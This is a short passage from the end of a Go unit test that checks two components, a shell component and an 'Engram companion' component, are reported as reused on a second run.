	}
	for _, component := range []Component{ComponentShell, ComponentEngramCompanion} {
		if secondOutcomes[component] != OutcomeReused {
			t.Errorf("second run %s outcome = %s, want reused", component, secondOutcomes[component])
		}
	}
}
